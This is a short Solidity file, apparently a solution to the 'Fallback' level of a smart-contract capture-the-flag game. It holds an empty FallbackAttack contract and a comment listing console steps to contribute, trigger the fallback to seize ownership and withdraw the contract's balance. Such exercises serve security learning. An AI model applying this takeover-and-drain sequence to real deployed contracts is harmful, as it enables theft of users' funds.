// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IFallback.sol";

/**
 * @notice There is no way to pass this level via contract call. Because of tx.origin != msg.sender.
 * @dev You can run orderly these scripts in client side:
 * > await contract.contribute({ value: toWei('0.0001') })
 * to make sure check result:
 * > await contract.getContribution()
 * > await contract.sendTransaction({ value: toWei('0.0001') })
 * to make sure check result:
 * > await contract.owner()
 * > await contract.withdraw()
 * to make sure check result:
 * > await getBalance(contract.address)
 * submit
 */
// solhint-disable-next-line no-empty-blocks
contract FallbackAttack {

}
